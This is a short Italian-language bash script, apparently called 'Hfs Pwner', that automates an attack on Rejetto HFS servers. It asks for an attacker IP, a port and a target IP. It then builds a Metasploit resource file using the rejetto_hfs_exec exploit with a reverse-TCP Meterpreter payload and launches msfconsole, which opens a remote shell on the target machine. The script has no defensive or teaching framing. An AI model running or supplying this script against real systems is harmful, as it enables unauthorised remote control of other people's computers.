#!/bin/bash
#Questo script è stato sviluppato da privatefound
echo "!----------------------------------!"
echo "!    Hfs Pwner By Privatefound     !"
echo "!    This script was developed	   !"
echo "!    By Privatefound and zapteam   !"
echo "!----------------------------------!"
echo " "
echo " "
echo -n "Inserisci il tuo ip privato da inserire nella backdoor > "
read ip
echo -n "Inserisci la porta su cui aprire la connessione > "
read porta
echo -n "Inserisci l'ip della macchina che si desidera attaccare > "
read macchina
#mkdir hfspwn
#cd hfspwn
notify-send "Hfs Exploiting Tool Is Running"
touch hsfpwn.rc
echo use exploit/windows/http/rejetto_hfs_exec >> hfspwn.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp >> hfspwn.rc
echo set LHOST $ip >> hfspwn.rc
echo set LPORT $porta >> hfspwn.rc
echo set RHOST $macchina >> hfspwn.rc
echo set ExitOnSession false >> hfspwn.rc
echo exploit -j -z >> hfspwn.rc
msfconsole -r hfspwn.rc

